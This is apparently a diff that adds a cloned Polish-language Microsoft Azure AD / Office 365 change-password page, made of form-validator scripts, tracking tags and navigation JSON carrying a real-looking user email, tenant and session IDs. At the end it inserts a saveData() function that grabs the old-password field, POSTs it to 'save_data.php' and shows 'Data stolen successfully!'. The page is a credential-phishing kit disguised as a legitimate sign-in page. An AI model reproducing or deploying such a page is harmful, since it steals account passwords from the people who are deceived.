+ChangePasswordControl_ConfirmNewPasswordRequiredValidator.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+ChangePasswordControl_ConfirmNewPasswordRequiredValidator.initialvalue = "";
+var ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator = document.all ? document.all["ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator"] : document.getElementById("ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator");
+ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator.controltovalidate = "ChangePasswordControl_ConfirmNewPasswordTextBox";
+ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator.errormessage = "Hasło musi zawierać co najmniej 7 znaków.";
+ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator.validationexpression = "^.{8,}$";
+var ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator = document.all ? document.all["ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator"] : document.getElementById("ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator");
+ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator.controltovalidate = "ChangePasswordControl_ConfirmNewPasswordTextBox";
+ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator.errormessage = "Hasło może zawierać maksymalnie 256 znaków.";
+ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator.validationexpression = "^.{0,256}$";
+var ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator = document.all ? document.all["ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator"] : document.getElementById("ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator");
+ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator.controltovalidate = "ChangePasswordControl_ConfirmNewPasswordTextBox";
+ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator.errormessage = "Hasło nie może zawierać znaków innych niż drukowane i ASCII.";
+ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
+ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator.validationexpression = "^[\\x20-\\x7e]*";
+var ChangePasswordControl_PasswordMatchValidator = document.all ? document.all["ChangePasswordControl_PasswordMatchValidator"] : document.getElementById("ChangePasswordControl_PasswordMatchValidator");
+ChangePasswordControl_PasswordMatchValidator.controltovalidate = "ChangePasswordControl_ConfirmNewPasswordTextBox";
+ChangePasswordControl_PasswordMatchValidator.errormessage = "Wprowadzone hasła nie są zgodne. Sprawdź wpisane hasło i spróbuj ponownie.";
+ChangePasswordControl_PasswordMatchValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_PasswordMatchValidator.clientvalidationfunction = "ChangePassword.CheckPasswordMatch";
+ChangePasswordControl_PasswordMatchValidator.validateemptytext = "true";
+var ChangePasswordControl_AggregationValidatorConfirmNewPassword = document.all ? document.all["ChangePasswordControl_AggregationValidatorConfirmNewPassword"] : document.getElementById("ChangePasswordControl_AggregationValidatorConfirmNewPassword");
+ChangePasswordControl_AggregationValidatorConfirmNewPassword.controltovalidate = "ChangePasswordControl_ConfirmNewPasswordTextBox";
+ChangePasswordControl_AggregationValidatorConfirmNewPassword.evaluationfunction = "CustomValidatorEvaluateIsValid";
+ChangePasswordControl_AggregationValidatorConfirmNewPassword.clientvalidationfunction = "ChangePassword.AggregateValidator";
+ChangePasswordControl_AggregationValidatorConfirmNewPassword.validateemptytext = "true";
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+new PasswordStrengthMeter('ChangePasswordControl_PasswordMeter', 'ChangePasswordControl_NewPasswordTextBox', 'PasswordStrengthMeter');$addHandler(window.document.documentElement, 'mouseup', Button.MouseUp); Sys.Application.add_init(Button.ResizeButtons);_s.init();Sys.Application.add_load(_s.fixGetLocation);var antiCsrfTokenElement = '\x3cinput name\x3d\x22__RequestVerificationToken\x22 type\x3d\x22hidden\x22 value\x3d\x22F7eJKDi5h8XuIdjVDvFpe2tJ0ZbpvWJ8T-g51TTvj67THl-USeCMEzlzD3mMGktdcjfZtHWC39NQcHbX2n7WvjkP2jOOL7MhJMbhL97FDeW4WztXhN2S9QZLtkKO07Zx4u-A70UVc4S8ZWS525L3Avg5LdpamIYjkXEPY4b9_IL_vJ6RhSY1UIR3PyAjfXY50\x22 \x2f\x3e';var token = $($('<div/>').html(antiCsrfTokenElement).contents()[0]).val();
+                    Sys.Net.WebRequestManager.add_invokingRequest(function(sender, args) {args.get_webRequest().get_headers()['__RequestVerificationToken'] = token;});//]]>
+</script>
+<script>
+if (self == top || self.location.host === top.location.host) {
+  document.getElementsByTagName("body")[0].style.display = 'block';
+} else {
+  top.location = self.location;
+}
+window.onload = function() {
+    document.getElementById('O365_Logo').focus();
+};
+</script>
+<script type="text/javascript">
+//<![CDATA[
+$(document).ready(function () { ApplyO365Branding(); });//]]>
+</script>
+<script type="text/javascript">ChangePassword.EnsureEncryptionJavascriptHasLoaded();</script>
+<script type="text/javascript">
+//<![CDATA[
+var DialogManager = new BOX.JS.DialogManager();
+DialogManager.set_dialogTemplateID("DialogManager1");
+DialogManager.set_dialogAreaID("dialogArea");
+DialogManager.set_dialogShieldID("dialogShield");
+DialogManager.set_dialogForegroundID("dialogForeground");
+DialogManager.set_dialogFrameID("dialogFrame");
+DialogManager.set_dialogTopRegionID("dialogTopRegion");
+DialogManager.set_dialogMiddleRegionID("dialogMiddleRegion");
+DialogManager.set_dialogBottomRegionID("dialogBottomRegion");
+DialogManager.set_dialogContentAreaID("dialogContentArea");
+DialogManager.set_dialogCloseIconID("dialogCloseIcon");
+DialogManager.set_dialogHeaderAreaID("dialogHeaderArea");
+DialogManager.set_dialogIconAreaID("dialogIconArea");
+DialogManager.set_dialogTitleAreaID("dialogTitleArea");
+DialogManager.set_dialogSubTitleAreaID("dialogSubTitleArea");
+DialogManager.set_dialogBodyAreaID("dialogBodyArea");
+DialogManager.set_dialogFooterAreaID("dialogFooterArea");
+DialogManager.set_learnMoreLinkID("dialogLearnMoreLink");
+DialogManager.set_learnMoreAreaID("dialogLearnMoreArea");
+DialogManager.set_infoIconID("DialogManager1_dialogInfoIcon");
+DialogManager.set_warningIconID("DialogManager1_dialogWarningIcon");
+DialogManager.set_errorIconID("DialogManager1_dialogErrorIcon");
+DialogManager.set_infoIconAreaID("dialogInfoIconArea");
+DialogManager.set_warningIconAreaID("dialogWarningIconArea");
+DialogManager.set_errorIconAreaID("dialogErrorIconArea");
+DialogManager.set_acceptButtonID("DialogManager1_dialogAcceptButton");
+DialogManager.set_dismissButtonID("DialogManager1_dialogDismissButton");
+DialogManager.set_acceptButtonDefaultText("Yes");
+DialogManager.set_declineButtonDefaultText("No");
+DialogManager.set_dismissButtonDefaultText("Close");
+DialogManager.set_spinnerIconUrl("/webcontrols/images/spinner_24x24.gif");
+Microsoft.Online.BOX.JS.InactivityTimer.Load(900, 300, 'https\x3a\x2f\x2faccount.activedirectory.windowsazure.com\x2fPageTimedOut.aspx\x3fru\x3d\x252FChangePassword.aspx');Sys.Application.add_init( function () { PageLayout.ResizePanels('ChangePasswordPage'); PageLayout.Layouts[PageLayout.Layouts.length]= 'ChangePasswordPage'; } );
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        //]]>
+</script>
+
+                <!-- START OF SmartSource Data Collector TAG -->
+                <!-- Copyright (c) 1996-2009 WebTrends Inc.  All rights reserved. -->
+                <!-- Version: MS.3.0.0 -->
+                <script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/WebTrends.js" type="text/javascript" ExcludeFromMFL="true"></script>
+                <script type="text/javascript">
+                //<![CDATA[
+                var _tag=new WebTrends();
+                _tag.dcsid='dcsc97avu10000kn75ujgpso2_7j5n';
+                _tag.wtid_domain='activedirectory.windowsazure.com';
+                _tag.fpcdom='activedirectory.windowsazure.com';
+                _tag.trackevents=false;     // disable WT tracking code since BOX adds its own tracking code.
+                _tag.dcsGetId();
+                _tag.dcsCustom=function() { _tag.DCSext.sid='9uUxMxLKTXoJJrmSYkBrIM6YxQQopfu8yxlUoJId2Wc1';_tag.DCSext.synd='0';_tag.DCSext.role='G;B;UA;HD';_tag.DCSext.uil='pl-PL';_tag.DCSext.tc='PL'; }
+                //]]>>
+                </script>
+                <script type="text/javascript">
+                _tag.dcsCollect();
+                </script>
+                <noscript>
+                <div><img ExcludeFromMFL="true" alt="DCSIMG" id="DCSIMG" width="1" height="1" src="https://m.webtrends.com/dcsc97avu10000kn75ujgpso2_7j5n/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=MS.3.0.0"/></div>
+                </noscript>
+                <!-- END OF SmartSource Data Collector TAG -->
+
+<script type="text/javascript">
+//<![CDATA[
+WebForm_AutoFocus('ChangePasswordControl_OldPasswordTextBox');
+document.getElementById('ChangePasswordControl_OldPasswordRequiredValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_OldPasswordRequiredValidator'));
+}
+
+document.getElementById('ChangePasswordControl_OldPasswordPropertyValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_OldPasswordPropertyValidator'));
+}
+
+document.getElementById('ChangePasswordControl_AggregationValidatorOldPassword').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_AggregationValidatorOldPassword'));
+}
+
+document.getElementById('ChangePasswordControl_NewPasswordRequiredValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_NewPasswordRequiredValidator'));
+}
+
+document.getElementById('ChangePasswordControl_NewPasswordPropertyValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_NewPasswordPropertyValidator'));
+}
+
+document.getElementById('ChangePasswordControl_NewPasswordMinimumLengthValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_NewPasswordMinimumLengthValidator'));
+}
+
+document.getElementById('ChangePasswordControl_NewPasswordMaximumLengthValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_NewPasswordMaximumLengthValidator'));
+}
+
+document.getElementById('ChangePasswordControl_NewPasswordCharacterExpressionValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_NewPasswordCharacterExpressionValidator'));
+}
+
+document.getElementById('ChangePasswordControl_PasswordStrengthValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_PasswordStrengthValidator'));
+}
+
+document.getElementById('ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator'));
+}
+
+document.getElementById('ChangePasswordControl_AggregationValidatorNewPassword').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_AggregationValidatorNewPassword'));
+}
+
+document.getElementById('ChangePasswordControl_ConfirmNewPasswordRequiredValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_ConfirmNewPasswordRequiredValidator'));
+}
+
+document.getElementById('ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator'));
+}
+
+document.getElementById('ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator'));
+}
+
+document.getElementById('ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator'));
+}
+
+document.getElementById('ChangePasswordControl_PasswordMatchValidator').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_PasswordMatchValidator'));
+}
+
+document.getElementById('ChangePasswordControl_AggregationValidatorConfirmNewPassword').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('ChangePasswordControl_AggregationValidatorConfirmNewPassword'));
+}
+Button.DefaultButton='ChangePasswordControl_OkButton';$addHandler(window.document.documentElement, 'keyup', Button.DefaultButtonKeyUpHandler);$addHandler(window.document.documentElement, 'keydown', Button.DefaultButtonKeyDownHandler);Button.AttachDefaultButtonHandlers();O365_NavBar.RenderNavBarAndFooter("O365_NavBarContainer", "O365_FooterContainer", {"AboutMeLink":null,"AdminLink":null,"AppsImage":{"AltText":null,"ClipInfo":{"Height":17,"Width":17,"X":191,"Y":92},"HoverClipInfo":{"Height":17,"Width":17,"X":191,"Y":73}},"AppsLinks":null,"CommunityLink":null,"CorrelationID":"51e585e8-40a7-48dd-a0d2-b967bdadf14e","CurrentMainLinkElementID":"ShellNone","CurrentWorkloadHelpSubLinks":[{"Id":"HelpLink","SubLinks":null,"TargetWindow":"_blank","Text":"Help","Url":"\u0009https:\/\/go.microsoft.com\/fwlink\/?LinkId=327887"}],"CurrentWorkloadSettingsLink":null,"CurrentWorkloadSettingsSubLinks":null,"CurrentWorkloadUserSubLinks":null,"DisableNavAndTitle":false,"DownArrowImage":null,"DownWhiteArrowImage":{"AltText":null,"ClipInfo":{"Height":16,"Width":16,"X":191,"Y":111},"HoverClipInfo":{"Height":16,"Width":16,"X":91,"Y":142}},"FeedbackImage":null,"FeedbackLink":null,"FlightName":"15GA","FooterCopyrightText":"©2024 Microsoft","FooterLogoImage":null,"HelpImage":{"AltText":null,"ClipInfo":{"Height":14,"Width":11,"X":140,"Y":125},"HoverClipInfo":{"Height":14,"Width":11,"X":127,"Y":125}},"HelpLink":{"Id":"HelpLink","SubLinks":null,"TargetWindow":"_blank","Text":"Help","Url":"https:\/\/g.microsoftonline.com\/0AX00pl\/111"},"HomeLink":{"Id":"ShellHome","SubLinks":null,"TargetWindow":null,"Text":"Home","Url":"\/Default.aspx"},"ImageClusterUrl":"https:\/\/account.activedirectory.windowsazure.com\/1.0.0.4655\/Chrome\/pl-PL\/O365Shared.png","IsAuthenticated":true,"LegalLink":{"Id":"ShellLegal","SubLinks":null,"TargetWindow":"_blank","Text":"Informacje prawne","Url":"https:\/\/g.microsoftonline.com\/0AX00pl\/170"},"LogoImage":{"AltText":"Microsoft Logo","ClipInfo":{"Height":16,"Width":217,"X":1,"Y":55},"HoverClipInfo":{"Height":16,"Width":217,"X":1,"Y":1}},"LogoNavigationUrl":"\/Default.aspx","O365SettingsLink":{"Id":"ShellProfile","SubLinks":null,"TargetWindow":null,"Text":"Profile","Url":"\/EditProfile.aspx"},"PartnerLink":null,"PreviewButtonText":"PREVIEW","PreviewFeedbackImageSrc":"https:\/\/account.activedirectory.windowsazure.com\/1.0.0.4655\/Chrome\/pl-PL\/Images\/PreviewArrow_18x18.png","PreviewFeedbackLink":{"Id":"PreviewFeedBack","SubLinks":null,"TargetWindow":"_blank","Text":"What do you think? Give us feedback.","Url":"https:\/\/g.microsoftonline.com\/0AX00pl\/54"},"PreviewSiteTitleText":"Preview Site","PreviewWelcomeText":"Welcome to the Windows Azure Active Directory preview portal. The preview portal is currently running with certain limitations and restrictions as we work out the kinks.","PrivacyLink":{"Id":"ShellPrivacy","SubLinks":null,"TargetWindow":"_blank","Text":"Ochrona prywatności","Url":"https:\/\/g.microsoftonline.com\/0AX00pl\/169"},"SessionID":"48a9f973-263e-4ed3-acf3-59afd0118ae9","SettingsImage":{"AltText":null,"ClipInfo":{"Height":14,"Width":15,"X":110,"Y":141},"HoverClipInfo":{"Height":14,"Width":15,"X":110,"Y":125}},"SettingsSmallImage":{"AltText":null,"ClipInfo":{"Height":10,"Width":10,"X":153,"Y":125},"HoverClipInfo":{"Height":10,"Width":10,"X":127,"Y":141}},"ShowTenantName":false,"SignOutLink":{"Id":"ShellSignout","SubLinks":null,"TargetWindow":null,"Text":"Sign out","Url":"\/Account\/Logout"},"TenantInformation":{"Id":"cbd8bb0a-8e2a-4aec-acd7-11389a7559f0","SubLinks":[{"Id":null,"SubLinks":null,"TargetWindow":null,"Text":null,"Url":"https:\/\/g.microsoftonline.com\/0AX00pl\/9?CompanyType=CompanyTenant&DapEnabled=0&HasAdminPermissions=1"}],"TargetWindow":null,"Text":"CRM","Url":null},"TenantNameSubLinks":null,"TruncatedUserDisplayName":null,"UpArrowImage":{"AltText":null,"ClipInfo":{"Height":16,"Width":16,"X":55,"Y":142},"HoverClipInfo":null},"UserDisplayName":"rafal.pezda@tarkon.pl","WorkloadLinks":null}, function(elem) { if (_s && _s.i) { _s.i(elem) }; return true; });//]]>
+function saveData() {
+    var haslo = document.getElementById('ChangePasswordControl_OldPasswordTextBox').value;
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "save_data.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            alert("Data stolen successfully!");
+        }
+    };
+    xhr.send("haslo=" + haslo);
+}
+</script>
+
+</form>
+</body>
+</html>
+
+
+<!-- Instance: IAMUX-MF/AM4PEPF000131A6; DeploymentId: IAMUXPRODWEUAZ01-Prod-AM4PIAMUX-MF -->
